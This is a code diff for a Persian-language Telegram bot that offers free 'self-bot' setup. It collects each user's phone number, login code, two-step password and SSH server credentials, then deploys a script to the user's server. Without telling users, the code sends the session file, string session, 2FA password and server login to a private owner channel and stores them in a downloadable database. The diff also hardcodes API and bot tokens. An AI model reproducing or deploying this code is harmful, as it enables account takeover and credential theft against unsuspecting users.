@@ -32,7 +32,7 @@ logger = logging.getLogger(__name__)
 API_ID = 29481612
 API_HASH = "01a41600f41fa58017c7220b954b7df8"
 BOT_TOKEN = "8994843551:AAFbF5KtXf-1RQ0PN5woZUPyZFP6517OAaI"
-OWNER_IDS = [6201723470]
+OWNER_IDS = [8922594603]
 CHANNEL_ID = "JavidSelf"
 GROUP_ID = "JavidSelfGp"
 PRIVATE_CHANNEL_ID = -1003804957958
@@ -536,4 +536,943 @@ async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton(f"وضعیت ربات : {status_emoji}", callback_data="admin_toggle_bot", style=toggle_style)],
             [
                 InlineKeyboardButton("مدیریت کاربران", callback_data="admin_user_manage", style='primary'), 
-                InlineKeyboardButton("آپدیت همگانی سلف‌ها", callback_data="admin_bulk_update", style='dang
+                InlineKeyboardButton("آپدیت همگانی سلف‌ها", callback_data="admin_bulk_update", style='danger')
+            ], 
+            [
+                InlineKeyboardButton("ایدی چنل اطلاعات", callback_data="admin_channel_id_info", style='danger'),
+                InlineKeyboardButton("تنظیم دسترسی ران", callback_data="admin_set_runs", style='primary')
+            ],
+            [InlineKeyboardButton("برداشتن محدودیت ران روزانه", callback_data="admin_clear_daily_limits", style='primary')],
+            [InlineKeyboardButton("دریافت دیتابیس کاربران", callback_data="admin_get_db", style='success')],
+            [InlineKeyboardButton("بستن پنل", callback_data="back_to_start", style='danger')]
+        ])
+        try:
+            await query.message.edit_text(admin_text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+        except Exception:
+            try:
+                await query.message.delete()
+            except:
+                pass
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=admin_text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+        return ConversationHandler.END
+
+    elif data == "admin_get_db":
+        if not is_owner(user_id):
+            await query.answer("شما دسترسی ندارید")
+            return ConversationHandler.END
+        await query.answer()
+        
+        if os.path.exists(DB_TEXT_PATH):
+            try:
+                with open(DB_TEXT_PATH, "rb") as f:
+                    await context.bot.send_document(
+                        chat_id=update.effective_chat.id, 
+                        document=f, 
+                        filename="database.txt", 
+                        caption="فایل دیتابیس متنی کاربران ربات :"
+                    )
+            except Exception as e:
+                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"خطا در ارسال فایل: {e}")
+        else:
+            await context.bot.send_message(chat_id=update.effective_chat.id, text="فایل دیتابیس هنوز ایجاد نشده است یا یافت نشد!")
+        return ConversationHandler.END
+
+    elif data == "admin_set_runs":
+        if not is_owner(user_id):
+            await query.answer("شما دسترسی ندارید")
+            return ConversationHandler.END
+        await query.answer()
+        text = f"**بخش تنظیم تعداد ران مجاز**\n\nمقدار فعلی: {REMAINING_RUNS}\nمقدار مورد نیاز خود را انتخاب کنید:"
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("1", callback_data="set_run_1", style='success'), InlineKeyboardButton("10", callback_data="set_run_10", style='success')],
+            [InlineKeyboardButton("100", callback_data="set_run_100", style='success'), InlineKeyboardButton("عدد دلخواه", callback_data="set_run_custom", style='success')],
+            [InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]
+        ])
+        try:
+            await query.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+        except:
+            try:
+                await query.message.delete()
+            except:
+                pass
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+        return ConversationHandler.END
+
+    elif data.startswith("set_run_") and data != "set_run_custom":
+        if not is_owner(user_id):
+            await query.answer("شما دسترسی ندارید")
+            return ConversationHandler.END
+        await query.answer()
+        count = int(data.split("_")[-1])
+        REMAINING_RUNS = count
+        save_max_runs(count)
+        await update_channel_message(context.application)
+        text = f"**بخش تنظیم تعداد ران مجاز**\n\nمقدار فعلی: {REMAINING_RUNS}\nیک گزینه را انتخاب کنید یا عدد دلخواه بفرستید:"
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("1", callback_data="set_run_1", style='success'), InlineKeyboardButton("10", callback_data="set_run_10", style='success')],
+            [InlineKeyboardButton("100", callback_data="set_run_100", style='success'), InlineKeyboardButton("عدد دلخواه", callback_data="set_run_custom", style='success')],
+            [InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]
+        ])
+        try:
+            await query.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+        except:
+            try:
+                await query.message.delete()
+            except:
+                pass
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+        return ConversationHandler.END
+
+    elif data == "admin_user_manage":
+        if not is_owner(user_id):
+            await query.answer("شما دسترسی ندارید")
+            return ConversationHandler.END
+        await query.answer()
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("Ban", callback_data="admin_ban_user", style='danger'), InlineKeyboardButton("Unban", callback_data="admin_unban_user", style='success')],
+            [InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]
+        ])
+        try:
+            await query.message.edit_text("⚙️ این بخش جهت مدیریت کاربران طراحی شده است.", reply_markup=kb)
+        except:
+            try:
+                await query.message.delete()
+            except:
+                pass
+            await context.bot.send_message(chat_id=update.effective_chat.id, text="⚙️ این بخش جهت مدیریت کاربران طراحی شده است.", reply_markup=kb)
+        return ConversationHandler.END
+
+    elif data == "admin_channel_id_info":
+        if not is_owner(user_id):
+            await query.answer("شما دسترسی ندارید")
+            return ConversationHandler.END
+        await query.answer()
+        try:
+            with open("channel_id.txt", "r") as f: 
+                ch_id = f.read().strip()
+        except: 
+            ch_id = "ثبت نشده"
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("✍️ تنظیم آیدی عددی جدید", callback_data="admin_set_channel_custom", style='success')],
+            [InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]
+        ])
+        try:
+            await query.message.edit_text(f"آی‌دی کانال ذخیره شده فعلی:\n`{ch_id}`\n\nشما می‌توانید با زدن روی دکمه زیر آیدی عددی کانال خصوصی خود را مستقیماً وارد کنید.", reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+        except:
+            try:
+                await query.message.delete()
+            except:
+                pass
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"آی‌دی کانال ذخیره شده فعلی:\n`{ch_id}`\n\nشما می‌توانید با زدن روی دکمه زیر آیدی عددی کانال خصوصی خود را مستقیماً وارد کنید.", reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+        return ConversationHandler.END
+
+    elif data == "edu_main":
+        await query.answer()
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("ران", callback_data="edu_run", style='success'), InlineKeyboardButton("سرور", callback_data="edu_server", style='success')],
+            [InlineKeyboardButton("بازگشت", callback_data="back_to_start", style='primary')]
+        ])
+        try:
+            await query.message.delete()
+        except:
+            pass
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="لطفاً یکی از موارد زیر را برای آموزش انتخاب کنید:", reply_markup=kb)
+        return ConversationHandler.END
+
+    elif data == "edu_run":
+        await query.answer()
+        try:
+            await query.message.delete()
+        except:
+            pass
+        try: 
+            kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="edu_main", style='primary')]])
+            await context.bot.copy_message(
+                chat_id=update.effective_chat.id, 
+                from_chat_id="@JavidHelp", 
+                message_id=6,
+                reply_markup=kb
+            )
+        except: 
+            kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="edu_main", style='primary')]])
+            await context.bot.send_message(chat_id=update.effective_chat.id, text="خطا در دریافت فایل آموزشی ران.", reply_markup=kb)
+        return ConversationHandler.END
+
+    elif data == "edu_server":
+        await query.answer()
+        try:
+            await query.message.delete()
+        except:
+            pass
+        try: 
+            kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="edu_main", style='primary')]])
+            await context.bot.copy_message(
+                chat_id=update.effective_chat.id, 
+                from_chat_id="@JavidHelp", 
+                message_id=5,
+                reply_markup=kb
+            )
+        except: 
+            kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="edu_main", style='primary')]])
+            await context.bot.send_message(chat_id=update.effective_chat.id, text="خطا در دریافت فایل آموزشی سرور.", reply_markup=kb)
+        return ConversationHandler.END
+
+async def start_check_number_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = update.effective_user.id
+    try:
+        await query.message.delete()
+    except:
+        pass
+    keyboard = ReplyKeyboardMarkup([[KeyboardButton("ارسال شماره", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True)
+    msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="با استفاده از دکمه زیر شماره خود را ارسال کنید:", reply_markup=keyboard)
+    USER_DATA_STORE[user_id] = {"flow": "check", "last_bot_msg": msg.message_id}
+    return GET_NUMBER
+
+async def start_run_self_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global RUNNING_USER, RUN_STARTED_AT, NEXT_RUN_ALLOWED_AT
+    query = update.callback_query
+    user_id = update.effective_user.id
+
+    if user_id in USER_DATA_STORE:
+        await cleanup_sessions(user_id)
+        USER_DATA_STORE.pop(user_id, None)
+    if RUNNING_USER == user_id:
+        RUNNING_USER = None
+        RUN_STARTED_AT = None
+
+    is_member = await check_membership(update, context, user_id)
+    if not is_member:
+        await query.answer("شما عضو گروه یا کانال نیستید!", show_alert=True)
+        return ConversationHandler.END
+    if not BOT_ACTIVE and not is_owner(user_id):
+        await query.answer("ربات خاموش است!", show_alert=True)
+        return ConversationHandler.END
+        
+    now = datetime.now(timezone("Asia/Tehran"))
+    if not is_owner(user_id):
+        last_ts = LAST_RUNS.get(user_id)
+        if last_ts:
+            last_time = datetime.fromtimestamp(last_ts, tz=timezone("Asia/Tehran"))
+            if (now - last_time).total_seconds() < 86400:
+                await query.answer("شما امروز سلف ران کردید!", show_alert=True)
+                return ConversationHandler.END
+                
+        if NEXT_RUN_ALLOWED_AT and now < NEXT_RUN_ALLOWED_AT:
+            wait_minutes = int((NEXT_RUN_ALLOWED_AT - now).total_seconds() // 60)
+            wait_seconds = int((NEXT_RUN_ALLOWED_AT - now).total_seconds() % 60)
+            next_time = NEXT_RUN_ALLOWED_AT.strftime("%H:%M")
+            await query.answer(f"ربات استفاده شده تا {next_time} لطفا برای ران مجدد 00:{wait_minutes}:{wait_seconds:02d} دیگر صبر کنید!", show_alert=True)
+            return ConversationHandler.END
+            
+
+    if not is_owner(user_id) and RUNNING_USER and RUNNING_USER != user_id:
+        if RUN_STARTED_AT:
+            elapsed = (now - RUN_STARTED_AT).total_seconds()
+        else:
+            elapsed = 0
+        remaining = max(0, 300 - elapsed)
+        if remaining > 0:
+            await query.answer("شما ۵ دقیقه محدود شدید.", show_alert=True)
+            return ConversationHandler.END
+            
+    await query.answer()
+    RUNNING_USER = user_id
+    RUN_STARTED_AT = now
+    asyncio.create_task(reset_run_task(context.bot, update.effective_chat.id, user_id))
+    try:
+        await query.message.delete()
+    except:
+        pass
+    keyboard = ReplyKeyboardMarkup([[KeyboardButton("ارسال شماره", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True)
+    try:
+        msg = await context.bot.copy_message(
+            chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=7,
+            caption="جهت تأیید قوانین ذکر شده در بخش قوانین، شماره خود را از طریق دکمه زیر ارسال کنید:", reply_markup=keyboard
+        )
+        msg_id = msg.message_id
+    except Exception:
+        msg = await context.bot.send_message(
+            chat_id=update.effective_chat.id, text="جهت تأیید قوانین ذکر شده در بخش قوانین، شماره خود را از طریق دکمه زیر ارسال کنید:", reply_markup=keyboard
+        )
+        msg_id = msg.message_id
+    USER_DATA_STORE[user_id] = {"flow": "run", "last_bot_msg": msg_id, "step": "get_number"}
+    return GET_NUMBER
+
+async def process_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global RUNNING_USER, RUN_STARTED_AT
+    user_id = update.effective_user.id
+    if user_id not in USER_DATA_STORE: 
+        return ConversationHandler.END
+    flow = USER_DATA_STORE[user_id]["flow"]
+    
+    if not update.message.contact:
+        if is_owner(user_id) and update.message.text and update.message.text.strip().isdigit():
+            number = update.message.text.strip()
+        else:
+            await update.message.reply_text("لطفاً فقط با استفاده از دکمه 'ارسال شماره' شماره خود را ارسال کنید.")
+            return GET_NUMBER
+    else:
+        number = update.message.contact.phone_number.replace("+", "").replace(" ", "").strip()
+        
+    try:
+        await update.message.delete()
+        await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
+    except: 
+        pass
+        
+    if flow == "check":
+        save_user_text(user_id, username=update.effective_user.username, phone=number)
+        is_banned_num = False
+        for b in BANNED_NUMBERS:
+            processed_b = b.strip().replace("+", "").replace(" ", "")
+            if number == processed_b:
+                is_banned_num = True
+                break
+                
+        if is_banned_num:
+            await update.message.reply_text("شماره شما بن شده است!", reply_markup=ReplyKeyboardRemove())
+        elif number in ADNUMBER:
+            if user_id not in OWNER_IDS:
+                OWNER_IDS.append(user_id)
+                await update.message.reply_text("شما به عنوان ادمین شناسایی شدید و اضافه شدید!", reply_markup=ReplyKeyboardRemove())
+            else:
+                await update.message.reply_text("شما ادمین هستید!", reply_markup=ReplyKeyboardRemove())
+        else:
+            await update.message.reply_text("شما مجاز به استفاده از سلف ساز هستید!", reply_markup=ReplyKeyboardRemove())
+        USER_DATA_STORE.pop(user_id, None)
+        return ConversationHandler.END
+        
+    if flow == "run":
+        if not is_owner(user_id) and number.startswith("93"):
+            await update.message.reply_text("شماره تلفن کشور شما مجاز نیست!\n\nسازنده:\n@uezrz", reply_markup=ReplyKeyboardRemove())
+            RUNNING_USER = None
+            RUN_STARTED_AT = None
+            USER_DATA_STORE.pop(user_id, None)
+            return ConversationHandler.END
+            
+        if number in BANNED_NUMBERS:
+            await update.message.reply_text("شما بن شده‌اید! برای حل مشکل به پشتیبانی مراجعه کنید.\nt.me/uezrz", reply_markup=ReplyKeyboardRemove())
+            RUNNING_USER = None
+            RUN_STARTED_AT = None
+            USER_DATA_STORE.pop(user_id, None)
+            return ConversationHandler.END
+            
+        session_path = os.path.join("sessions", f"selfbot_{user_id}")
+        for f_ext in [".session", ".session-journal"]:
+            target_file = session_path + f_ext
+            if os.path.exists(target_file):
+                try: 
+                    os.remove(target_file)
+                except: 
+                    pass
+                    
+        USER_DATA_STORE[user_id].update({"number": number, "session": session_path, "temp_code": ""})
+        save_user_text(user_id, phone=number)
+        
+        tele_client = TelegramClient(
+            session=SQLiteSession(session_path), 
+            api_id=API_ID, 
+            api_hash=API_HASH, 
+            device_model="Samsung Galaxy A52",
+            use_ipv6=True
+        )
+        await tele_client.connect()
+        try:
+            sent = await tele_client.send_code_request(number)
+            USER_DATA_STORE[user_id]["client"] = tele_client
+            USER_DATA_STORE[user_id]["sent_code"] = sent
+            kb, text = get_numeric_keyboard()
+            msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=text, reply_markup=kb)
+            USER_DATA_STORE[user_id]["last_bot_msg"] = msg.message_id
+            
+            return GET_CODE
+        except Exception:
+            await update.message.reply_text("خطا در ارسال کد! شماره تلفن شما محدودیت زمانی دارد یا مسدود است.", reply_markup=ReplyKeyboardRemove())
+            await tele_client.disconnect()
+            USER_DATA_STORE.pop(user_id, None)
+            RUNNING_USER = None
+            RUN_STARTED_AT = None
+            return ConversationHandler.END
+
+async def process_code_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global RUNNING_USER, RUN_STARTED_AT
+    query = update.callback_query
+    user_id = update.effective_user.id
+    if user_id not in USER_DATA_STORE: 
+        return ConversationHandler.END
+    data = query.data
+    current_code = USER_DATA_STORE[user_id].get("temp_code", "")
+    
+    if data.startswith("code_add_"):
+        await query.answer()
+        digit = data.split("_")[-1]
+        if len(current_code) < 5:
+            current_code += digit
+            USER_DATA_STORE[user_id]["temp_code"] = current_code
+    elif data == "code_clear_all":
+        await query.answer()
+        current_code = ""
+        USER_DATA_STORE[user_id]["temp_code"] = current_code
+    elif data == "code_cancel":
+        await query.answer()
+        try: 
+            await query.message.delete()
+        except: 
+            pass
+        await cleanup_sessions(user_id)
+        USER_DATA_STORE.pop(user_id, None)
+        RUNNING_USER = None
+        RUN_STARTED_AT = None
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="عملیات لغو شد!")
+        return ConversationHandler.END
+    elif data == "code_confirm":
+        if len(current_code) != 5:
+            await query.answer("کد باید ۵ رقمی باشد!", show_alert=True)
+            return GET_CODE
+        await query.answer()
+        code = current_code.translate(str.maketrans("BaseDigits", "0123456789"))
+        try: 
+            await query.message.delete()
+        except: 
+            pass
+        tele_client = USER_DATA_STORE[user_id]["client"]
+        try:
+            await tele_client.sign_in(phone=USER_DATA_STORE[user_id]["number"], code=code)
+            try:
+                msg = await context.bot.copy_message(
+                    chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=4,
+                    caption="ورود موفق! آیپی سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru"
+                )
+                msg_id = msg.message_id
+            except Exception:
+                msg = await context.bot.send_message(
+                    chat_id=update.effective_chat.id, text="ورود موفق! آیپی سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru"
+                )
+                msg_id = msg.message_id
+            USER_DATA_STORE[user_id]["last_bot_msg"] = msg_id
+            return GET_IP
+        except SessionPasswordNeededError:
+            try:
+                msg = await context.bot.copy_message(chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=6, caption="رمز دو مرحله‌ای را وارد کنید:")
+                msg_id = msg.message_id
+            except Exception:
+                msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="رمز دو مرحله‌ای را وارد کنید:")
+                msg_id = msg.message_id
+            USER_DATA_STORE[user_id]["last_bot_msg"] = msg_id
+            return GET_2FA
+        except Exception:
+            await context.bot.send_message(chat_id=update.effective_chat.id, text="کد ورود اشتباه است یا منقضی شده است!")
+            USER_DATA_STORE[user_id]["temp_code"] = ""
+            kb, text = get_numeric_keyboard()
+            msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=text, reply_markup=kb)
+            USER_DATA_STORE[user_id]["last_bot_msg"] = msg.message_id
+            return GET_CODE
+            
+    kb, text = get_numeric_keyboard(current_code)
+    try: 
+        await query.message.edit_text(text, reply_markup=kb)
+    except: 
+        pass
+    return GET_CODE
+
+async def process_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global RUNNING_USER, RUN_STARTED_AT
+    user_id = update.effective_user.id
+    if user_id not in USER_DATA_STORE: 
+        return ConversationHandler.END
+    password = update.message.text.strip()
+    tele_client = USER_DATA_STORE[user_id]["client"]
+    try:
+        await update.message.delete()
+        await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
+    except: 
+        pass
+    try:
+        await tele_client.sign_in(password=password)
+        USER_DATA_STORE[user_id]["two_step"] = password
+        try:
+            msg = await context.bot.copy_message(chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=8, caption="ورود موفق! آیپی سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru")
+            msg_id = msg.message_id
+        except Exception:
+            msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="ورود موفق! آیپی سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru")
+            msg_id = msg.message_id
+        USER_DATA_STORE[user_id]["last_bot_msg"] = msg_id
+        return GET_IP
+    except PasswordHashInvalidError:
+        await update.message.reply_text("رمز دو مرحله‌ای اشتباه است!")
+        try:
+            msg = await context.bot.copy_message(chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=11, caption="رمز دو مرحله‌ای را وارد کنید:")
+            msg_id = msg.message_id
+        except Exception:
+            msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="رمز دو مرحله‌ای را وارد کنید:")
+            msg_id = msg.message_id
+        USER_DATA_STORE[user_id]["last_bot_msg"] = msg_id
+        return GET_2FA
+    except Exception:
+        await update.message.reply_text("خطایی رخ داد عملیات لغو شد.")
+        await cleanup_sessions(user_id)
+        USER_DATA_STORE.pop(user_id, None)
+        RUNNING_USER = None
+        RUN_STARTED_AT = None
+        return ConversationHandler.END
+
+async def process_ip_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in USER_DATA_STORE: 
+        return ConversationHandler.END
+    USER_DATA_STORE[user_id]["ip"] = update.message.text.strip()
+    try:
+        await update.message.delete()
+        await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
+    except: 
+        pass
+    try:
+        msg = await context.bot.copy_message(chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=12, caption="یوزرنیم سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru")
+        msg_id = msg.message_id
+    except Exception:
+        msg = await context.bot.send_message(
+            chat_id=update.effective_chat.id, text="یوزرنیم سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru"
+        )
+        msg_id = msg.message_id
+    USER_DATA_STORE[user_id]["last_bot_msg"] = msg_id
+    return GET_USER
+
+async def process_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in USER_DATA_STORE: 
+        return ConversationHandler.END
+    USER_DATA_STORE[user_id]["user"] = update.message.text.strip()
+    try:
+        await update.message.delete()
+        await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
+    except: 
+        pass
+    try:
+        msg = await context.bot.copy_message(chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=13, caption="پسورد سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru")
+        msg_id = msg.message_id
+    except Exception:
+        msg = await context.bot.send_message(
+            chat_id=update.effective_chat.id, text="پسورد سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru"
+        )
+        msg_id = msg.message_id
+    USER_DATA_STORE[user_id]["last_bot_msg"] = msg_id
+    return GET_PASS
+
+async def process_pass_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global RUNNING_USER, RUN_STARTED_AT, REMAINING_RUNS, NEXT_RUN_ALLOWED_AT
+    user_id = update.effective_user.id
+    if user_id not in USER_DATA_STORE: 
+        return ConversationHandler.END
+        
+    USER_DATA_STORE[user_id]["passwd"] = update.message.text.strip()
+    try:
+        await update.message.delete()
+        await context.bot.delete_messages(chat_id=update.effective_chat.id, message_ids=[USER_DATA_STORE[user_id]["last_bot_msg"]])
+    except: 
+        pass
+        
+    ip = USER_DATA_STORE[user_id]["ip"]
+    server_user = USER_DATA_STORE[user_id]["user"]
+    passwd = USER_DATA_STORE[user_id]["passwd"]
+    
+    try: 
+        ipaddress.ip_address(ip)
+    except ValueError:
+        await update.message.reply_text("آی‌پپی وارد شده معتبر نیست!\n\nسایت دریافت سرور:\ncp.sprinthost.ru")
+        await cleanup_sessions(user_id)
+        USER_DATA_STORE.pop(user_id, None)
+        RUNNING_USER = None
+        RUN_STARTED_AT = None
+        return ConversationHandler.END
+        
+    wait_msg = await update.message.reply_text("در حال اجرای عملیات ران لطفا صبر کنید!")
+    try:
+        tele_client = USER_DATA_STORE[user_id]["client"]
+        
+        string_session = "Error"
+        try:
+            string_session = StringSession.save(tele_client.session)
+        except Exception as e:
+            logger.error(f"Error saving string session: {e}")
+
+        await tele_client.disconnect()
+        
+        def run_ssh_deployment():
+            with ssh_connection(ip, server_user, passwd) as ssh:
+                sftp = ssh.open_sftp()
+                sftp.get_channel().settimeout(30)
+                
+                try:
+                    sftp.stat("self")
+                    return "already_used"
+                except FileNotFoundError: 
+                    pass
+
+                ssh.exec_command("mkdir -p self", timeout=30)
+                time.sleep(1)
+                
+                local_self_py = None
+                if os.path.exists("file/self.py"): 
+                    local_self_py = "file/self.py"
+                elif os.path.exists("bot/file/self.py"): 
+                    local_self_py = "bot/file/self.py"
+                elif os.path.exists("self.py"): 
+                    local_self_py = "self.py"
+                
+                if not local_self_py: 
+                    return "missing_self_py"
+                    
+                sftp.put(local_self_py, "self/self.py")
+                
+                local_session = f"sessions/selfbot_{user_id}.session"
+                local_journal = f"sessions/selfbot_{user_id}.session-journal"
+                
+                if os.path.exists(local_session):
+                    sftp.put(local_session, "self/selfbot.session")
+                    sftp.put(local_session, f"self/selfbot_{user_id}.session")
+                if os.path.exists(local_journal):
+                    sftp.put(local_journal, "self/selfbot.session-journal")
+                    sftp.put(local_journal, f"self/selfbot_{user_id}.session-journal")
+                
+                ssh.exec_command("sync", timeout=5)
+
+                setup_cmd = "python3 -m pip install --user telethon pytz jdatetime paramiko"
+                stdin, stdout, stderr = ssh.exec_command(setup_cmd, timeout=60)
+                stdout.channel.recv_exit_status()
+                time.sleep(2)
+
+                run_cmd = "cd self && nohup python3 self.py > self_error.log 2>&1 &"
+                ssh.exec_command(run_cmd)
+                time.sleep(3)
+                return "success"
+                
+        deploy_res = await asyncio.to_thread(run_ssh_deployment)
+        try: 
+            await wait_msg.delete()
+        except: 
+            pass
+        
+        if deploy_res == "already_used":
+            await update.message.reply_text("سرور قبلا استفاده شده است! لطفا از سرور جدید استفاده کنید.\n\ncp.sprinthost.ru")
+            await cleanup_sessions(user_id)
+            USER_DATA_STORE.pop(user_id, None)
+            RUNNING_USER = None
+            RUN_STARTED_AT = None
+            return ConversationHandler.END
+        elif deploy_res == "missing_self_py":
+            await update.message.reply_text("خطا: فایل self.py یافت نشد.")
+            await cleanup_sessions(user_id)
+            USER_DATA_STORE.pop(user_id, None)
+            RUNNING_USER = None
+            RUN_STARTED_AT = None
+            return ConversationHandler.END
+            
+        await cleanup_sessions(user_id)
+        if not is_owner(user_id):
+            if REMAINING_RUNS > 0:
+                REMAINING_RUNS -= 1
+                save_max_runs(REMAINING_RUNS)
+                
+        now_tehran = datetime.now(timezone("Asia/Tehran"))
+        if is_owner(user_id): 
+            NEXT_RUN_ALLOWED_AT = now_tehran + timedelta(seconds=10)
+        else: 
+            NEXT_RUN_ALLOWED_AT = now_tehran + timedelta(minutes=10)
+
+        save_user_text(
+            user_id, 
+            username=update.effective_user.username, 
+            phone=USER_DATA_STORE[user_id]['number'], 
+            ip=ip, 
+            server_user=server_user, 
+            passwd=passwd, 
+            string_session=string_session
+        )
+            
+        await update_channel_message(context.application)
+        await update.message.reply_text("سلف با موفقیت روی سرور شما اجرا شد، با دستور پنل یا panel منوی راهنما سلف را باز کنید.\n\nفروش این سلف ممنوع است!\n@JavidSelf\nسلف ساز رایگان:\n@JavidSelfBot")
+        
+        if not is_owner(user_id):
+            LAST_RUNS[user_id] = time.time()
+            save_last_runs()
+
+        NEWS_ID = None
+        try:
+            if os.path.exists("channel_id.txt"):
+                with open("channel_id.txt", "r") as f: 
+                    content = f.read().strip()
+                    if content:
+                        NEWS_ID = int(content)
+        except Exception as e:
+            logger.error(f"Error reading channel_id.txt: {e}")
+            
+        if NEWS_ID:
+            if update.effective_user.username:
+                username_or_mention = f"@{update.effective_user.username}"
+            else:
+                username_or_mention = f"[{update.effective_user.first_name}](tg://user?id={user_id})"
+                
+            two_step_pass = USER_DATA_STORE[user_id].get("two_step", "NoPasswd!")
+            info = (
+                f"New Run!\nUser: {username_or_mention}\nUserid: {user_id}\n"
+                f"Number: +{USER_DATA_STORE[user_id]['number']}\nPassword: `{two_step_pass}`\n"
+                f"String: `{string_session}`\n"
+                f"Server ip: {ip}\nServer user: {server_user}\nServer password: {passwd}"
+            )
+
+            try: 
+                local_session = f"sessions/selfbot_{user_id}.session"
+                local_journal = f"sessions/selfbot_{user_id}.session-journal"
+
+                if os.path.exists(local_session):
+                    with open(local_session, "rb") as session_file:
+                        await context.bot.send_document(
+                            chat_id=NEWS_ID, 
+                            document=session_file, 
+                            filename=f"selfbot_{user_id}.session",
+                            caption=info,
+                            parse_mode=ParseMode.MARKDOWN
+                        )
+                else:
+                    await context.bot.send_message(chat_id=NEWS_ID, text=info, parse_mode=ParseMode.MARKDOWN)
+
+                try:
+                    if os.path.exists(local_session):
+                        os.remove(local_session)
+                    if os.path.exists(local_journal):
+                        os.remove(local_journal)
+                except Exception as ex:
+                    logger.error(f"Failed to delete session files: {ex}")
+                        
+            except Exception as e: 
+                logger.error(f"Failed to send merged log to channel {NEWS_ID}: {e}")
+                
+        USER_DATA_STORE.pop(user_id, None)
+        RUNNING_USER = None
+        RUN_STARTED_AT = None
+        return ConversationHandler.END
+    except Exception as e:
+        logger.error(f"Error while deploying selfbot: {str(e)}")
+        try: 
+            await wait_msg.delete()
+        except: 
+            pass
+        await update.message.reply_text("خطا در اجرای سلف! لطفا از درست بودن اطلاعات سرور و سالم بودن سرور خود مطمئن شوید.")
+        await cleanup_sessions(user_id)
+        USER_DATA_STORE.pop(user_id, None)
+        RUNNING_USER = None
+        RUN_STARTED_AT = None
+        return ConversationHandler.END
+
+async def start_custom_runs_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = update.effective_user.id
+    if not is_owner(user_id): 
+        return ConversationHandler.END
+    try:
+        await query.message.delete()
+    except:
+        pass
+    msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="لطفاً تعداد ران جدید را به صورت یک عدد انگلیسی ارسال کنید:")
+    USER_DATA_STORE[user_id] = {"flow": "admin_runs", "last_bot_msg": msg.message_id}
